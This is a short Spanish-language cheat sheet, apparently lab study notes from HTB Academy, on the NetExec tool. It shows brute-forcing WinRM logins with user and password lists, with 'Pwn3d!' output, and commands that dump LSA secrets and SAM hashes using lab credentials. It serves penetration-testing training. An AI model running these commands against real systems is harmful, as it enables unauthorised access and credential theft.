Herramienta que permite interactuar con distintos protocolos
```
Available Protocols:
  {nfs,ftp,ssh,winrm,smb,wmi,rdp,mssql,ldap,vnc}
    nfs                 own stuff using NFS
    ftp                 own stuff using FTP
    ssh                 own stuff using SSH
    winrm               own stuff using WINRM
    smb                 own stuff using SMB
    wmi                 own stuff using WMI
    rdp                 own stuff using RDP
    mssql               own stuff using MSSQL
    ldap                own stuff using LDAP
    vnc                 own stuff using VNC
```

Manual especifico por protocolo
```
netexec smb -h
```

### Uso
```
netexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>
```
Ejemplo:
```
netexec winrm 10.129.42.197 -u user.list -p password.list

WINRM       10.129.42.197   5985   NONE             [*] None (name:10.129.42.197) (domain:None)
WINRM       10.129.42.197   5985   NONE             [*] http://10.129.42.197:5985/wsman
WINRM       10.129.42.197   5985   NONE             [+] None\user:password (Pwn3d!)
```
`NOTA: Que diga Pwn3d! es que fue exitoso y podriamos ejecutar comandos de consola`


### Volcado de hashes LSA/SAM
Usuario utilizado debe contar con privilegios de administrador local
```
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```
```
netexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```